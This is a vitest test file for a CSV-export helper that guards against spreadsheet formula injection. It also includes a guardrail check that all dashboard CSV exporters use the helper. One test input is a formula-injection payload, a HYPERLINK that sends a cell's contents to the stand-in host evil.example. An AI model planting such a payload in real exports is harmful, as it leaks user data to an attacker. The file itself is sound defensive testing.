// Copyright (c) 2026 Swazz Authors
// This file is part of Swazz
// Swazz is licensed under the Business Source License 1.1 (BSL 1.1)
// See the LICENSE file in the project root or visit https://github.com/SecH0us3/swazz for more details

import { describe, it, expect } from 'vitest';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { csvCell, toCsv } from './csv.js';

describe('csvCell', () => {
    it.each(['=HYPERLINK("https://evil.example/?d="&A2,"Click")', '+1+1', '-2+3', '@SUM(A1)', '\t=1', '\r=1'])(
        'neutralizes a cell starting with a formula trigger: %s',
        (value) => {
            const cell = csvCell(value);
            expect(cell.startsWith(`"'`)).toBe(true);
        },
    );

    it('quotes and doubles embedded quotes', () => {
        expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    });

    it('leaves ordinary values alone and handles empty ones', () => {
        expect(csvCell('Mozilla/5.0')).toBe('"Mozilla/5.0"');
        expect(csvCell(42)).toBe('"42"');
        expect(csvCell(null)).toBe('""');
        expect(csvCell(undefined)).toBe('""');
    });

    it('toCsv joins rows of neutralized cells', () => {
        expect(toCsv([['a', '=1'], ['b', 'c']], '\n')).toBe(`"a","'=1"\n"b","c"`);
    });
});

// Guardrail: every CSV export in the dashboard goes through csvCell/toCsv. Hand-rolled quoting
// (only doubling quotes) is exactly what left the login history and audit trail exports open to
// formula injection.
describe('CSV exports use the formula-safe helper', () => {
    const srcDir = join(__dirname, '..');
    const files: string[] = [];
    const walk = (dir: string) => {
        for (const name of readdirSync(dir)) {
            const path = join(dir, name);
            if (statSync(path).isDirectory()) walk(path);
            else if (/\.(ts|tsx)$/.test(name) && !/\.test\.(ts|tsx)$/.test(name)) files.push(path);
        }
    };
    walk(srcDir);
    const exporters = files.filter(f => readFileSync(f, 'utf8').includes('text/csv'));

    it('finds the known exporters', () => {
        expect(exporters.length).toBeGreaterThanOrEqual(2);
    });

    it.each(exporters.map(f => [f.slice(srcDir.length + 1), f]))('%s builds its CSV with toCsv/csvCell', (_name, file) => {
        const source = readFileSync(file, 'utf8');
        expect(source).toMatch(/\b(toCsv|csvCell)\(/);
        expect(source).not.toMatch(/replace\(\/"\/g, '""'\)/);
    });
});
